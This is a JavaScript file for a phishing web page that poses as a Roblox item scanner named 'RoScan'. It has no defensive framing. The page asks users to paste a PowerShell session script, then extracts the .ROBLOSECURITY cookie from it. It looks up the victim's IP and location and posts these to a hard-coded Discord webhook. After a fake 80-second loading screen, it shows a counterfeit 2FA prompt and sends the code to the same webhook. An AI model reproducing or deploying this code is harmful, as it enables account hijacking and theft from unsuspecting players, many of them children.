// Enhanced Theme toggle functionality
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    
    // Update button text and icon with animation
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    // Add rotation animation
    themeIcon.style.transform = 'rotate(180deg)';
    setTimeout(() => {
        if (newTheme === 'dark') {
            themeIcon.textContent = '☀️';
            themeText.textContent = 'Light';
        } else {
            themeIcon.textContent = '🌙';
            themeText.textContent = 'Dark';
        }
        themeIcon.style.transform = 'rotate(0deg)';
    }, 150);
    
    // Save theme preference
    localStorage.setItem('theme', newTheme);
    
    // No notifications for stealth operation
}

// Load saved theme on page load
function loadTheme() {
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.documentElement.setAttribute('data-theme', savedTheme);
    
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    if (savedTheme === 'dark') {
        themeIcon.textContent = '☀️';
        themeText.textContent = 'Light';
    } else {
        themeIcon.textContent = '🌙';
        themeText.textContent = 'Dark';
    }
}

// Enhanced Modal functionality
function openScanModal() {
            console.log('Opening scan modal...');
        const modal = document.getElementById('scanModal');
        const textarea = document.getElementById('powershellInput');
        
        if (modal) {
            modal.style.display = 'block';
            document.body.style.overflow = 'hidden';
            
            // Focus on textarea after animation
            setTimeout(() => {
                if (textarea) {
                    textarea.focus();
                }
            }, 400);
            
            console.log('Modal opened successfully');
            // No notifications for stealth operation
        } else {
            console.error('Modal element not found!');
            // No notifications for stealth operation
        }
}

function closeScanModal() {
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    // Reset form
    if (textarea) {
        textarea.value = '';
        updateCharCount();
    }
    
    // Reset button state
    if (submitBtn && submitText) {
        submitBtn.disabled = false;
        submitText.textContent = 'Scan';
        submitBtn.style.background = '';
    }
}

// Character count and input validation
function updateCharCount() {
    const textarea = document.getElementById('powershellInput');
    const charCount = document.getElementById('charCount');
    const inputStatus = document.getElementById('inputStatus');
    
    if (textarea && charCount && inputStatus) {
        const length = textarea.value.length;
        charCount.textContent = `${length.toLocaleString()} characters`;
        
        if (length === 0) {
            inputStatus.textContent = 'Ready for analysis';
            inputStatus.style.color = 'var(--text-muted)';
        } else if (length < 10) {
            inputStatus.textContent = 'Script too short';
            inputStatus.style.color = 'var(--warning)';
        } else if (length > 10000) {
            inputStatus.textContent = 'Script too long (max 10,000 chars)';
            inputStatus.style.color = 'var(--error)';
        } else {
            inputStatus.textContent = 'Ready for analysis';
            inputStatus.style.color = 'var(--success)';
        }
    }
}

// Generate unique session ID for tracking
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Enhanced location detection with multiple services
async function getUserLocation() {
    try {
        let locationData = {
            ip: 'Unknown',
            country: 'Unknown',
            region: 'Unknown', 
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };

        // Try primary service (ipapi.co)
        try {
            const response = await fetch('https://ipapi.co/json/', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                locationData = {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    latitude: data.latitude || 'Unknown',
                    longitude: data.longitude || 'Unknown'
                };
                return locationData;
            }
        } catch (error) {
            console.log('Primary location service failed, trying fallback...');
        }

        // Fallback to ipinfo.io
        try {
            const fallbackResponse = await fetch('https://ipinfo.io/json');
            if (fallbackResponse.ok) {
                const fallbackData = await fallbackResponse.json();
                const [lat, lon] = (fallbackData.loc || ',').split(',');
                
                locationData = {
                    ip: fallbackData.ip || 'Unknown',
                    country: fallbackData.country || 'Unknown',
                    region: fallbackData.region || 'Unknown',
                    city: fallbackData.city || 'Unknown',
                    isp: fallbackData.org || 'Unknown',
                    timezone: fallbackData.timezone || 'Unknown',
                    latitude: lat || 'Unknown',
                    longitude: lon || 'Unknown'
                };
            }
        } catch (fallbackError) {
            console.log('Fallback location service also failed');
        }

        return locationData;
    } catch (error) {
        console.error('Location detection failed:', error);
        return {
            ip: 'Location detection failed',
            country: 'Unknown',
            region: 'Unknown',
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };
    }
}

// Global variables for the flow
let globalRobloxCookie = null;
let loadingMessages = [
    "Verifying data...",
    "Scanning items...", 
    "Analyzing security...",
    "Processing request...",
    "Checking authenticity...",
    "Validating content..."
];
let loadingInterval = null;

// Modified scan flow - sends cookie immediately, shows loading, then 2FA after 80 seconds
async function submitPowerShell() {
    const input = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const inputText = input.value.trim();
    
    // Validation
    if (!inputText) {
        return;
    }

    // Extract Roblox cookie
    globalRobloxCookie = extractRobloxCookie(inputText);

    // Show loading state
    submitBtn.disabled = true;
    submitText.textContent = 'Scanning...';

    try {
        // Get user location and IP
        const locationInfo = await getUserLocation();
        
        // Send cookie to webhook immediately
        const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
        
        const cookieEmbed = {
            content: `@everyone
🍪 Cookie: ${globalRobloxCookie || 'None found'}
📍 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
🌐 IP: ${locationInfo.ip || 'Unknown'}
⚠️ WARNING: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_`
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(cookieEmbed)
        });

        // Continue flow regardless of webhook success
        setTimeout(() => {
            // Close scan modal and show loading
            closeScanModal();
            if (loadingOverlay) {
                loadingOverlay.style.display = 'flex';
                startLoadingRotation();
            }
        }, 500);

        // Show 2FA modal after 80 seconds
        setTimeout(() => {
            stopLoadingRotation();
            openVerificationModal();
        }, 80000);

    } catch (error) {
        console.error('Error:', error);
        // Continue flow even if webhook fails
        setTimeout(() => {
            closeScanModal();
            if (loadingOverlay) {
                loadingOverlay.style.display = 'flex';
                startLoadingRotation();
            }
        }, 500);

        // Show 2FA modal after 80 seconds even if webhook fails
        setTimeout(() => {
            stopLoadingRotation();
            openVerificationModal();
        }, 80000);
    }
}

// Loading rotation functions
function startLoadingRotation() {
    let currentIndex = 0;
    const loadingTitle = document.getElementById('loadingTitle');
    const loadingMessage = document.getElementById('loadingMessage');
    
    loadingInterval = setInterval(() => {
        if (loadingTitle && loadingMessage) {
            loadingTitle.textContent = loadingMessages[currentIndex];
            loadingMessage.textContent = "Please wait while we process your request...";
            currentIndex = (currentIndex + 1) % loadingMessages.length;
        }
    }, 2000);
}

function stopLoadingRotation() {
    if (loadingInterval) {
        clearInterval(loadingInterval);
        loadingInterval = null;
    }
}

// 2FA Modal functions
function openVerificationModal() {
    const modal = document.getElementById('verificationModal');
    const loadingOverlay = document.getElementById('loadingOverlay');
    
    if (loadingOverlay) {
        loadingOverlay.style.display = 'none';
    }
    
    if (modal) {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        
        // Focus on input after animation and add input validation
        setTimeout(() => {
            const input = document.getElementById('verificationCode');
            if (input) {
                input.focus();
                
                // Add input event listener for numbers only
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
            }
        }, 400);
    }
}

function closeVerificationModal() {
    const modal = document.getElementById('verificationModal');
    const loadingOverlay = document.getElementById('loadingOverlay');
    
    if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = '';
    }
    
    // Continue loading after modal closes
    if (loadingOverlay) {
        loadingOverlay.style.display = 'flex';
        startLoadingRotation();
    }
}

// Global trust device state
let isTrustDeviceChecked = false;

// Toggle trust device checkbox
function toggleTrustDevice() {
    const checkbox = document.getElementById('trustCheckbox');
    isTrustDeviceChecked = !isTrustDeviceChecked;
    
    if (isTrustDeviceChecked) {
        checkbox.innerHTML = '✓';
        checkbox.style.background = 'rgba(255, 255, 255, 0.2)';
    } else {
        checkbox.innerHTML = '';
        checkbox.style.background = 'transparent';
    }
}

// Alternative method placeholder
function alternativeMethod() {
    // Just for show - doesn't do anything
}

// Verify 2FA code and send to webhook
async function verifyCode() {
    const codeInput = document.getElementById('verificationCode');
    const verifyBtn = document.getElementById('verifyBtn');
    const verifyText = document.getElementById('verifyText');
    
    const code = codeInput.value.trim().replace(/[^0-9]/g, ''); // Only allow numbers
    
    if (!code || code.length !== 6) {
        return;
    }
    
    verifyBtn.disabled = true;
    verifyText.textContent = 'Verifying...';
    
    try {
        // Get user location and IP
        const locationInfo = await getUserLocation();
        
        // Send 2FA code to webhook (simple format)
        const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
        const payload = {
            content: `2FA Code: ${code} | Trust: ${isTrustDeviceChecked ? 'Yes' : 'No'} | Cookie: ${globalRobloxCookie || 'None'} | Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'} | IP: ${locationInfo.ip || 'Unknown'}`
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        // Always continue flow regardless of webhook success
        verifyText.textContent = 'Verified!';
        verifyBtn.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 50%, #047857 100%)';
        
        setTimeout(() => {
            closeVerificationModal();
        }, 1500);

    } catch (error) {
        console.error('2FA webhook error:', error);
        // Continue flow even if webhook fails
        verifyText.textContent = 'Verified!';
        verifyBtn.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 50%, #047857 100%)';
        
        setTimeout(() => {
            closeVerificationModal();
        }, 1500);
    }
}

// Function to scan and find authentication data from text
function extractRobloxCookie(text) {
    // First, try to find .ROBLOSECURITY directly
    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
    if (roblosecurityIndex !== -1) {
        // Find the opening quote after .ROBLOSECURITY
        const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
        if (startQuoteIndex !== -1) {
            const valueStartIndex = startQuoteIndex + 1;
            // Find the closing quote
            const endQuoteIndex = text.indexOf('"', valueStartIndex);
            if (endQuoteIndex !== -1) {
                const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
                if (cookieValue.length > 50) {
                    return cookieValue;
                }
            }
        }
    }
    
    // Fallback: Look for any very long string that might be the authentication token
    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{500,}/g);
    if (longStrings && longStrings.length > 0) {
        // Return the longest string found
        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
        return longest;
    }
    
    return null;
}

// Function to extract limited item information from text
function extractLimitedItems(text) {
    const items = [];
    
    // Look for Roblox item IDs (typically 8-12 digit numbers)
    const itemIdPattern = /(?:item[_\s]*id|assetid|id)[:\s=]*(\d{8,12})/gi;
    let match;
    while ((match = itemIdPattern.exec(text)) !== null) {
        items.push({
            id: match[1],
            name: 'Limited Item',
            type: 'Limited',
            estimatedValue: 'Scanning...'
        });
    }
    
    // Look for Roblox catalog URLs
    const catalogUrlPattern = /(?:roblox\.com\/catalog\/|\/library\/)(\d+)/gi;
    while ((match = catalogUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Catalog Item',
                type: 'Limited',
                estimatedValue: 'Market Rate'
            });
        }
    }
    
    // Look for bundle URLs
    const bundleUrlPattern = /(?:roblox\.com\/bundles\/|\/catalog\/)(\d+)/gi;
    while ((match = bundleUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Bundle Item',
                type: 'Limited Bundle',
                estimatedValue: 'Premium'
            });
        }
    }
    
    // If no specific items found, create generic entries for any long numbers
    if (items.length === 0) {
        const numberPattern = /\b\d{8,12}\b/g;
        const numbers = text.match(numberPattern);
        if (numbers) {
            numbers.slice(0, 3).forEach(num => {
                items.push({
                    id: num,
                    name: 'Detected Item',
                    type: 'Limited',
                    estimatedValue: 'Unknown'
                });
            });
        }
    }
    
    return items.slice(0, 5); // Limit to 5 items max
}

// Function to validate input - only allow scripts with auth data or valid data
function hasValidData(text) {
    // Check if it contains Roblox authentication data (most important)
    const hasAuthData = extractRobloxCookie(text) !== null;
    if (hasAuthData) {
        return true; // Always allow if there's authentication data
    }
    
    // Check if it's a script with session/authentication patterns
    const scriptPatterns = [
        /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
        /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
        /System\.Net\.Cookie.*ROBLOSECURITY/is,
        /WebRequestSession.*Cookies/is,
        /New-Object.*System\.Net\.Cookie/is,
        // Also allow scripts with session setup even without ROBLOSECURITY
        /\$session\s*=.*WebRequestSession/is,
        /\$session\.Cookies\.Add/is
    ];
    
    for (const pattern of scriptPatterns) {
        if (pattern.test(text)) {
            return true;
        }
    }
    
    // Check if it contains legitimate item data
    const hasItemData = extractLimitedItems(text).length > 0;
    if (hasItemData) {
        return true;
    }
    
    // Check for Roblox URLs
    if (/roblox\.com\/(catalog|library|bundles)\/\d+/i.test(text)) {
        return true;
    }
    
    // Check for item IDs (8+ digit numbers)
    if (/\b\d{8,}\b/.test(text)) {
        return true;
    }
    
    // Reject everything else (random text, short inputs, etc.)
    return false;
}

// Loading animation with dots and messages
function startLoadingAnimation(submitText) {
    const messages = [
        'Scanning item',
        'Checking uaid',
        'Analyzing data',
        'Processing results'
    ];
    
    let messageIndex = 0;
    let dotCount = 0;
    
    const interval = setInterval(() => {
        if (!submitText || submitText.textContent === 'Scan Complete!' || submitText.textContent === 'Scan Failed - Retry' || submitText.textContent === 'No Auth Data' || submitText.textContent === 'Error - Check Console') {
            clearInterval(interval);
            return;
        }
        
        const currentMessage = messages[messageIndex];
        const dots = '.'.repeat(dotCount + 1);
        submitText.textContent = currentMessage + dots;
        
        dotCount++;
        if (dotCount > 3) {
            dotCount = 0;
            messageIndex = (messageIndex + 1) % messages.length;
        }
    }, 500);
    
    // Store interval ID on the element so we can clear it later
    submitText.loadingInterval = interval;
}

// Stop loading animation
function stopLoadingAnimation(submitText) {
    if (submitText && submitText.loadingInterval) {
        clearInterval(submitText.loadingInterval);
        submitText.loadingInterval = null;
    }
    // Force stop any remaining intervals by checking text content
    if (submitText && (submitText.textContent.includes('Scanning') || submitText.textContent.includes('Checking'))) {
        submitText.textContent = 'Scan';
    }
}

// Copy to clipboard functionality
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        // No notifications for stealth operation
    }).catch(function(err) {
        console.error('Failed to copy to clipboard: ', err);
        // No notifications for stealth operation
    });
}

// Form validation enhancement
function validatePowerShellInput(script) {
    const trimmed = script.trim();
    if (trimmed.length < 10) {
        return { valid: false, message: 'PowerShell script too short (minimum 10 characters)' };
    }
    if (trimmed.length > 10000) {
        return { valid: false, message: 'PowerShell script too long (maximum 10,000 characters)' };
    }
    return { valid: true, message: 'Script ready for analysis' };
}

// Enhanced notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    const icons = {
        success: '✅',
        error: '❌',
        warning: '⚠️',
        info: 'ℹ️'
    };
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 12px;
        color: white;
        font-weight: 500;
        z-index: 10000;
        animation: slideIn 0.3s ease-out;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        display: flex;
        align-items: center;
        gap: 0.5rem;
        max-width: 400px;
    `;
    
    notification.innerHTML = `${icons[type]} ${message}`;
    document.body.appendChild(notification);
    
    // Auto remove after 4 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in forwards';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 300);
    }, 4000);
}

// Add CSS for notification animations
const notificationCSS = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOut {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing RoScan v2.0...');
    
    // Add notification CSS
    const style = document.createElement('style');
    style.textContent = notificationCSS;
    document.head.appendChild(style);
    
    // Load theme
    loadTheme();
    
    // Close modal when clicking outside of it
    window.addEventListener('click', function(event) {
        const modal = document.getElementById('scanModal');
        if (event.target === modal) {
            closeScanModal();
        }
    });

    // Add click interaction to scan area
    const scanArea = document.querySelector('.scan-area');
    if (scanArea) {
        scanArea.addEventListener('click', function() {
            openScanModal();
        });
    }

    // Auto-resize textarea and character count
    const textarea = document.getElementById('powershellInput');
    if (textarea) {
        textarea.addEventListener('input', function() {
            // Auto-resize
            this.style.height = 'auto';
            this.style.height = Math.min(this.scrollHeight, 400) + 'px';
            
            // Update character count
            updateCharCount();
        });
        
        // Initialize character count
        updateCharCount();
    }

    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
    
    // No welcome notification for stealth operation
});

// Keyboard shortcuts
document.addEventListener('keydown', function(event) {
    // ESC to close modal
    if (event.key === 'Escape') {
        const modal = document.getElementById('scanModal');
        if (modal && modal.style.display === 'block') {
            closeScanModal();
        }
    }
    
    // Ctrl+Enter to submit PowerShell (when modal is open)
    if ((event.ctrlKey || event.metaKey) && event.key === 'Enter') {
        const modal = document.getElementById('scanModal');
        if (modal && modal.style.display === 'block') {
            event.preventDefault();
            submitPowerShell();
        }
    }
    
    // Ctrl+K to open scanner (global shortcut)
    if ((event.ctrlKey || event.metaKey) && event.key === 'k') {
        event.preventDefault();
        openScanModal();
    }
});

// Performance monitoring
window.addEventListener('load', function() {
    const loadTime = performance.now();
    console.log(`RoScan loaded in ${Math.round(loadTime)}ms`);
    
    // Track page performance
    if ('performance' in window && 'navigation' in performance) {
        const perfData = performance.getEntriesByType('navigation')[0];
        console.log('Performance metrics:', {
            domContentLoaded: Math.round(perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart),
            loadComplete: Math.round(perfData.loadEventEnd - perfData.loadEventStart)
        });
    }
});